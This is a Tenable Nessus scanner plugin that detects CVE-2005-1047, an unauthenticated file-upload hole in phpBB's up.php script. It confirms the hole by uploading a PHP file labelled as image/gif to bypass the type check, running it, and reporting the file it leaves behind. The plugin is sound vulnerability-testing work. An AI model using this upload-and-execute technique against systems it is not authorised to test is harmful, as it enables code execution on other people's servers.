#
# (C) Tenable Network Security
#


  desc["english"] = "
Synopsis :

The remote web server contains a PHP script that allows arbitrary file
uploads. 

Description :

The installed version of phpBB on the remote host includes a file
upload script intended as a way for users to upload files that they
can then link to in their posts.  The script, however, does not
require authentication, makes only a limited check of upload file
types, and stores uploads in a known location.  As a result, an
attacker can upload arbitrary scripts to the remote host and execute
them with the permissions of the web server user. 

See also :

http://archives.neohapsis.com/archives/bugtraq/2005-04/0116.html

Solution : 

Uninstall the file upload script from phpBB.

Risk factor : 

High / CVSS Base Score : 7
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(18007);
  script_version("$Revision: 1.2 $");

  script_cve_id("CVE-2005-1047");
  script_bugtraq_id(13084);

  name["english"] = "phpBB File Upload Script Vulnerability";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for file upload script vulnerability in phpBB";
  script_summary(english:summary["english"]);
 
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  family["english"] = "CGI abuses";
  script_family(english:family["english"]);

  script_dependencies("phpbb_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/phpBB"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Let's try to upload a PHP script.
  fname = string(SCRIPT_NAME, ".php");

  boundary = "bound";
  req = string(
    "POST ",  dir, "/up.php HTTP/1.1\r\n",
    "Host: ", get_host_name(), "\r\n",
    "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
    "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
    # nb: we'll add the Content-Length header and post data later.
  );
  boundary = string("--", boundary);
  postdata = string(
    boundary, "\r\n",
    'Content-Disposition: form-data; name="userfile"; filename="', fname, '"', "\r\n",
    # nb: the script prevents "text/plain" so we'll lie.
    "Content-Type: image/gif\r\n",
    "\r\n",
    "<? phpinfo() ?>\r\n",

    boundary, "--", "\r\n"
  );
  req = string(
    req,
    "Content-Length: ", strlen(postdata), "\r\n",
    "\r\n",
    postdata
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # Try to identify the uploaded file.
  #
  # nb: this should go into "uploads/" but we'll do a search to be sure.
  pat = string("<a href=([^>]+/)", fname, ">", fname, "</a>");
  matches = egrep(pattern:pat, string:res, icase:TRUE);
  foreach match (split(matches)) {
    match = chomp(match);
    upload = eregmatch(pattern:pat, string:match);
    if (upload == NULL) break;
    upload = string(dir, "/", upload[1], fname);
    break;
  }

  if (!isnull(upload)) {
    # Make sure the uploaded script can be run.
    req = http_get(item:upload, port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # If we could run it, there's a problem.
    if ("PHP Version" >< res) {
      report = string(
        desc["english"],
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Nessus has successfully exploited this vulnerability by uploading\n",
        "an image file with PHP code that reveals information about the\n",
        "PHP configuration on the remote host. The file is located under\n",
        "the web server's document directory as:\n",
        "  ", upload, "\n",
        "You are strongly encouraged to delete this file as soon as\n",
        "possible as it can be run by anyone who accesses it remotely.\n"
      );
      security_hole(port:port, data:report);
      exit(0);
    }
  }
}
